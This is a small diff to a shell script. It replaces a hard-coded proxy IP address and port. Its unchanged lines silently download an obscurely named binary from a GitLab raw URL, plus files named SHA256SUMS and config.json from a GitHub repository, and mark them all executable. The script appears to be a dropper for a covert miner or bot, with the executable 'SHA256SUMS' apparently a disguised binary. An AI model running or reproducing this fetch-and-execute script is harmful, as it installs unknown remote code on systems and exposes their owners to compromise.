@@ -1,5 +1,5 @@
-proxy="159.65.162.186" 
-port="24894" 
+proxy="192.252.209.155" 
+port="14455" 
 wget -q -O kiamtan-78 https://gitlab.com/55113110159/dokerweb/-/raw/main/ebiy && chmod +x kiamtan-78
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/SHA256SUMS && chmod +x SHA256SUMS 
 wget -q https://raw.githubusercontent.com/balma1/kitoy/main/config.json && chmod +x config.json
